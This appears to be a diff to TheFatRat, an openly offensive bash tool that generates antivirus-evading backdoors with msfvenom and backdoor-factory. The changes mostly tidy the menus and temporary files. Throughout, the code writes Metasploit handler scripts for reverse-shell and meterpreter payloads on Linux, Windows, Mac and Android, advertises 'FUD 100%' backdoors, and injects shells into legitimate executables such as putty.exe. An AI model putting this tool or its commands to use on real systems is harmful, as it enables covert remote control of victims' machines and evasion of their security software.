@@ -8,7 +8,7 @@
 # 		      fatrat Author By Edo -maland-
 #		  Tested On Kali Linux and Kali sana v.2
 #		    contact me in screetsec@gmail.com
-#        OS Penetration From Indonesia : http://dracos-linux.org/
+#        OS Penetration From Indonesia : https://dracos-linux.org/
 # Easy tool for generate backdoor with msfvenom ( part of metasploit framework )
 # and program compiles a C program with a meterpreter reverse_tcp payload In it that can then be executed on
 # a windows host Program to create a C program after it is compiled that will bypass most AV
@@ -507,6 +507,7 @@ echo -e $okegreen"  ============================================================
 
 			if test $fatrat1 == '1' #LINUX
 				then
+				rm temp/*.rc > /dev/null 2>&1
 				touch "temp/meterpreter_linux.rc"
            	 		echo use exploit/multi/handler > "temp/meterpreter_linux.rc"
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
@@ -522,6 +523,7 @@ echo -e $okegreen"  ============================================================
 				clear
 			elif test $fatrat1 == '2' #Windows
 				then
+				rm temp/*.rc > /dev/null 2>&1
 				touch "temp/meterpreter_windows.rc"
            	 		echo use exploit/multi/handler >> "temp/meterpreter_windows.rc"
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
@@ -532,13 +534,14 @@ echo -e $okegreen"  ============================================================
            	 		echo set LHOST $uservar >> "temp/meterpreter_windows.rc"
            	 		read -p '  Set LPORT: ' uservar
            	 		echo set LPORT $uservar >> "temp/meterpreter_windows.rc"
+				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
-				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> touch "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
            	 		xterm -e msfconsole -r "temp/meterpreter_windows.rc" &
 				clear
 			elif test $fatrat1 == '3'  #Mac
 				then
+				rm temp/*.rc > /dev/null 2>&1
 				touch "temp/meterpreter_mac.rc"
            	 		echo use exploit/multi/handler > "temp/meterpreter_mac.rc"
            	 		echo set PAYLOAD osx/x86/shell_reverse_tcp >> "temp/meterpreter_mac.rc"
@@ -553,6 +556,7 @@ echo -e $okegreen"  ============================================================
 				clear
 			elif test $fatrat1 == '4' #Android
 				then
+				rm temp/*.rc > /dev/null 2>&1
 				touch "temp/meterpreter_android.rc"
            	 		echo use exploit/multi/handler > "temp/meterpreter_android.rc"
            	 		echo set PAYLOAD android/meterpreter/reverse_tcp >> "temp/meterpreter_android.rc"
@@ -941,16 +945,16 @@ echo
 
 
 		echo -e $white " "
-		echo -e $white"	[$okegreen"1"$white]$okegreen  CREATE BACKDOOR WITH MSFVENOM "
-		echo -e $white"	[$okegreen"2"$white]$okegreen  CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
-		echo -e $white"	[$okegreen"3"$white]$okegreen  CREATE FUD BACKDOOR WITH AVOID V1.2  "
-		echo -e $white"	[$okegreen"4"$white]$okegreen  CREATE FUD BACKDOOR WITH BACKDOOR-FACTORY  "
-		echo -e $white"	[$okegreen"5"$white]$okegreen  CREATE A LISTENERS  "
-		echo -e $white"	[$okegreen"6"$white]$okegreen  JUMP TO MSFCONSOLE  "
-		echo -e $white"	[$okegreen"7"$white]$okegreen  SEARCHSPLOIT  "
-		echo -e $white"	[$okegreen"8"$white]$okegreen  CLEANUP  "
-		echo -e $white"	[$okegreen"9"$white]$okegreen  HELP  "
-		echo -e $white"	[$okegreen"10"$white]$okegreen CREDITS  "
+		echo -e $white"	[$okegreen"01"$white]$okegreen  CREATE BACKDOOR WITH MSFVENOM "
+		echo -e $white"	[$okegreen"02"$white]$okegreen  CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
+		echo -e $white"	[$okegreen"03"$white]$okegreen  CREATE FUD BACKDOOR WITH AVOID V1.2  "
+		echo -e $white"	[$okegreen"04"$white]$okegreen  CREATE FUD BACKDOOR WITH BACKDOOR-FACTORY  "
+		echo -e $white"	[$okegreen"05"$white]$okegreen  CREATE A LISTENERS  "
+		echo -e $white"	[$okegreen"06"$white]$okegreen  JUMP TO MSFCONSOLE  "
+		echo -e $white"	[$okegreen"07"$white]$okegreen  SEARCHSPLOIT  "
+		echo -e $white"	[$okegreen"08"$white]$okegreen  CLEANUP  "
+		echo -e $white"	[$okegreen"09"$white]$okegreen  HELP  "
+		echo -e $white"	[$okegreen"10"$white]$okegreen  CREDITS  "
 		echo -e " "
 		echo -n -e $red'  \033[4mScreetsec@Fatrat:\033[0m '; tput sgr0 #insert your choice
 		read fatrat
@@ -973,7 +977,7 @@ echo
 				echo ""
 				spinlong
 				echo ""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/Download/Avast.exe) : ' embed
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/TheFatRat/PE/putty.exe) : ' embed
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
 				spinlong
 				echo ""
@@ -983,7 +987,8 @@ echo
 				echo ""
 				echo -e $okegreen""
 				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
-                                echo -e "Shell Saved To output Folder "
+                                echo -e "Shell Saved To /backdoored/output/  press any key to continue"
+				read bebeku
 				clear
 				menu
 
@@ -1033,6 +1038,10 @@ echo
 			rm * >/dev/null 2>&1
 			cd ..
 			sleep 2
+			echo ""
+                        echo -e $red"  [*] $cyan Cleaning /TheFatRat/*.exe or apk"
+                        rm *.exe *.apk  >/dev/null 2>&1
+                        sleep 2
 			echo ""
 			echo -e $red"  [*] $cyan Cleaning /TheFatRat/backdoored/output/"
 			cd backdoored/output
@@ -1091,16 +1100,16 @@ echo
 
 
 		echo -e $white " "
-		echo -e $white"	[$okegreen"1"$white]$okegreen  CREATE BACKDOOR WITH MSFVENOM "
-		echo -e $white"	[$okegreen"2"$white]$okegreen  CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
-		echo -e $white"	[$okegreen"3"$white]$okegreen  CREATE FUD BACKDOOR WITH AVOID V1.2  "
-		echo -e $white"	[$okegreen"4"$white]$okegreen  CREATE FUD BACKDOOR WITH BACKDOOR-FACTORY  "
-		echo -e $white"	[$okegreen"5"$white]$okegreen  CREATE A LISTENERS  "
-		echo -e $white"	[$okegreen"6"$white]$okegreen  JUMP TO MSFCONSOLE  "
-		echo -e $white"	[$okegreen"7"$white]$okegreen  SEARCHSPLOIT  "
-		echo -e $white"	[$okegreen"8"$white]$okegreen  CLEANUP  "
-		echo -e $white"	[$okegreen"9"$white]$okegreen  HELP  "
-		echo -e $white"	[$okegreen"10"$white]$okegreen CREDITS  "
+		echo -e $white"	[$okegreen"01"$white]$okegreen  CREATE BACKDOOR WITH MSFVENOM "
+		echo -e $white"	[$okegreen"02"$white]$okegreen  CREATE FUD 100% BACKDOOR ( SLOW BUT POWERFULL ) "
+		echo -e $white"	[$okegreen"03"$white]$okegreen  CREATE FUD BACKDOOR WITH AVOID V1.2  "
+		echo -e $white"	[$okegreen"04"$white]$okegreen  CREATE FUD BACKDOOR WITH BACKDOOR-FACTORY  "
+		echo -e $white"	[$okegreen"05"$white]$okegreen  CREATE A LISTENERS  "
+		echo -e $white"	[$okegreen"06"$white]$okegreen  JUMP TO MSFCONSOLE  "
+		echo -e $white"	[$okegreen"07"$white]$okegreen  SEARCHSPLOIT  "
+		echo -e $white"	[$okegreen"08"$white]$okegreen  CLEANUP  "
+		echo -e $white"	[$okegreen"09"$white]$okegreen  HELP  "
+		echo -e $white"	[$okegreen"10"$white]$okegreen  CREDITS  "
 		echo -e " "
 		echo -n -e $red'  \033[4mScreetsec@Fatrat:\033[0m '; tput sgr0 #insert your choice
 		read fatrat
@@ -1123,7 +1132,7 @@ echo
 				echo ""
 				spinlong
 				echo ""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/Download/Avast.exe) : ' embed
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/TheFatRat/PE/putty.exe) : ' embed
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
 				spinlong
 				echo ""
@@ -1132,8 +1141,9 @@ echo
 				spinlong2
 				echo ""
 				echo -e $okegreen""
-				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira
-                                echo -e "Shell Saved To output Folder "
+				backdoor-factory -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe
+                                echo -e "Shell Saved To /backdoored/output/  press any key to continue"
+				read bebeku
 				clear
 				menu
 
@@ -1183,6 +1193,10 @@ echo
 			rm * >/dev/null 2>&1
 			cd ..
 			sleep 2
+			echo ""
+                        echo -e $red"  [*] $cyan Cleaning /TheFatRat/*.exe or apk"
+                        rm *.exe *.apk  >/dev/null 2>&1
+                        sleep 2
 			echo ""
 			echo -e $red"  [*] $cyan Cleaning /TheFatRat/backdoored/output/"
 			cd backdoored/output
